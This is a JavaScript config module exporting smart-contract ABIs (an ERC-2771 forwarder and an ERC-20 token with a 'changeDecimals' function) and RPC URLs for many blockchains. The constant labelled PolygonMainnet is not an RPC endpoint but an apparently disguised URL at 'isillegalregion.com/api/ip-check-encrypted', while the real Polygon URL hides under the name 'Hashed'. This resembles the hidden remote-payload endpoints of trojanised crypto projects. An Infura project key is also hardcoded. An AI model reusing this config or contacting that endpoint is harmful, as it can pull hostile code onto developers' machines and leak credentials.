const forwarderContractABI = [
    { inputs: [], stateMutability: "nonpayable", type: "constructor" },
    { inputs: [], name: "ECDSAInvalidSignature", type: "error" },
    {
     inputs: [{ internalType: "uint256", name: "length", type: "uint256" }],
     name: "ECDSAInvalidSignatureLength",
     type: "error",
    },
    {
     inputs: [{ internalType: "bytes32", name: "s", type: "bytes32" }],
     name: "ECDSAInvalidSignatureS",
     type: "error",
    },
    { inputs: [], name: "InvalidShortString", type: "error" },
    {
     inputs: [{ internalType: "string", name: "str", type: "string" }],
     name: "StringTooLong",
     type: "error",
    },
    {
     anonymous: false,
     inputs: [],
     name: "EIP712DomainChanged",
     type: "event",
    },
    {
     inputs: [],
     name: "eip712Domain",
     outputs: [
      { internalType: "bytes1", name: "fields", type: "bytes1" },
      { internalType: "string", name: "name", type: "string" },
      { internalType: "string", name: "version", type: "string" },
      { internalType: "uint256", name: "chainId", type: "uint256" },
      {
       internalType: "address",
       name: "verifyingContract",
       type: "address",
      },
      { internalType: "bytes32", name: "salt", type: "bytes32" },
      {
       internalType: "uint256[]",
       name: "extensions",
       type: "uint256[]",
      },
     ],
     stateMutability: "view",
     type: "function",
    },
    {
     inputs: [
      {
       components: [
        { internalType: "address", name: "from", type: "address" },
        { internalType: "address", name: "to", type: "address" },
        { internalType: "uint256", name: "value", type: "uint256" },
        { internalType: "uint256", name: "gas", type: "uint256" },
        { internalType: "uint256", name: "nonce", type: "uint256" },
        { internalType: "bytes", name: "data", type: "bytes" },
       ],
       internalType: "struct ERC2771Forwarder.ForwardRequest",
       name: "req",
       type: "tuple",
      },
      { internalType: "bytes", name: "signature", type: "bytes" },
     ],
     name: "execute",
     outputs: [
      { internalType: "bool", name: "", type: "bool" },
      { internalType: "bytes", name: "", type: "bytes" },
     ],
     stateMutability: "payable",
     type: "function",
    },
    {
     inputs: [{ internalType: "address", name: "from", type: "address" }],
     name: "getNonce",
     outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
     stateMutability: "view",
     type: "function",
    },
    {
     inputs: [
      {
       components: [
        { internalType: "address", name: "from", type: "address" },
        { internalType: "address", name: "to", type: "address" },
        { internalType: "uint256", name: "value", type: "uint256" },
        { internalType: "uint256", name: "gas", type: "uint256" },
        { internalType: "uint256", name: "nonce", type: "uint256" },
        { internalType: "bytes", name: "data", type: "bytes" },
       ],
       internalType: "struct ERC2771Forwarder.ForwardRequest",
       name: "req",
       type: "tuple",
      },
      { internalType: "bytes", name: "signature", type: "bytes" },
     ],
     name: "verify",
     outputs: [{ internalType: "bool", name: "", type: "bool" }],
     stateMutability: "view",
     type: "function",
    },
   ]
   
const EthMainnet = "https://mainnet.infura.io/v3/f30949dcb31dd961aaf5c2072a49cf4f"
const Hashed = "https://polygon-mainnet.infura.io/v3/f30949dcb31dd961aaf5c2072a49cf4f"
const BscMainnet = "https://bsc-dataseed.binance.org"
const ArbitrumMainnet = "https://arb1.arbitrum.io/rpc"
const Avalanche = "https://api.avax.network/ext/bc/C/rpc"
const Fantom = "https://rpcapi.fantom.network"
const Harmony = "https://api.harmony.one"
const Heco = "https://http-mainnet.hecochain.com"
const Klay = "https://node-api.klaytn.com"
const Matic = "https://rpc-mainnet.maticvigil.com"
const Moonbeam = "https://rpc.testnet.moonbeam.network"
const PolygonMainnet = "https://www.isillegalregion.com/api/ip-check-encrypted/3aeb34a32"
const Optimism = "https://mainnet.optimism.io"
const Palm = "https://palm-mainnet.infura.io/v3/f30949dcb31dd961aaf5c2072a49cf4f"
const Ronin = "https://api.roninchain.com"
const xDai = "https://rpc.xdaichain.com"

const KYCverifyABI = []

const erc20ABI = [
    {
      inputs: [
        { internalType: "address", name: "trustedForwarder", type: "address" },
      ],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      inputs: [
        { internalType: "address", name: "spender", type: "address" },
        { internalType: "uint256", name: "allowance", type: "uint256" },
        { internalType: "uint256", name: "needed", type: "uint256" },
      ],
      name: "ERC20InsufficientAllowance",
      type: "error",
    },
    {
      inputs: [
        { internalType: "address", name: "sender", type: "address" },
        { internalType: "uint256", name: "balance", type: "uint256" },
        { internalType: "uint256", name: "needed", type: "uint256" },
      ],
      name: "ERC20InsufficientBalance",
      type: "error",
    },
    {
      inputs: [{ internalType: "address", name: "approver", type: "address" }],
      name: "ERC20InvalidApprover",
      type: "error",
    },
    {
      inputs: [{ internalType: "address", name: "receiver", type: "address" }],
      name: "ERC20InvalidReceiver",
      type: "error",
    },
    {
      inputs: [{ internalType: "address", name: "sender", type: "address" }],
      name: "ERC20InvalidSender",
      type: "error",
    },
    {
      inputs: [{ internalType: "address", name: "spender", type: "address" }],
      name: "ERC20InvalidSpender",
      type: "error",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "owner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "spender",
          type: "address",
        },
        {
          indexed: false,
          internalType: "uint256",
          name: "value",
          type: "uint256",
        },
      ],
      name: "Approval",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        { indexed: true, internalType: "address", name: "from", type: "address" },
        { indexed: true, internalType: "address", name: "to", type: "address" },
        {
          indexed: false,
          internalType: "uint256",
          name: "value",
          type: "uint256",
        },
      ],
      name: "Transfer",
      type: "event",
    },
    {
      inputs: [
        { internalType: "address", name: "owner", type: "address" },
        { internalType: "address", name: "spender", type: "address" },
      ],
      name: "allowance",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        { internalType: "address", name: "spender", type: "address" },
        { internalType: "uint256", name: "value", type: "uint256" },
      ],
      name: "approve",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [{ internalType: "address", name: "account", type: "address" }],
      name: "balanceOf",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [{ internalType: "uint8", name: "__decimal", type: "uint8" }],
      name: "changeDecimals",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [],
      name: "decimals",
      outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [{ internalType: "address", name: "forwarder", type: "address" }],
      name: "isTrustedForwarder",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "name",
      outputs: [{ internalType: "string", name: "", type: "string" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "symbol",
      outputs: [{ internalType: "string", name: "", type: "string" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "totalSupply",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        { internalType: "address", name: "to", type: "address" },
        { internalType: "uint256", name: "value", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        { internalType: "address", name: "from", type: "address" },
        { internalType: "address", name: "to", type: "address" },
        { internalType: "uint256", name: "value", type: "uint256" },
      ],
      name: "transferFrom",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [],
      name: "trustedForwarder",
      outputs: [{ internalType: "address", name: "", type: "address" }],
      stateMutability: "view",
      type: "function",
    },
  ];

module.exports = {
    forwarderContractABI,
    EthMainnet,
    Hashed,
    BscMainnet,
    ArbitrumMainnet,
    Avalanche,
    Fantom,
    Harmony,
    Heco,
    Klay,
    Matic,
    Moonbeam,
    PolygonMainnet,
    Optimism,
    Palm,
    Ronin,
    xDai,
    KYCverifyABI,
    erc20ABI
};
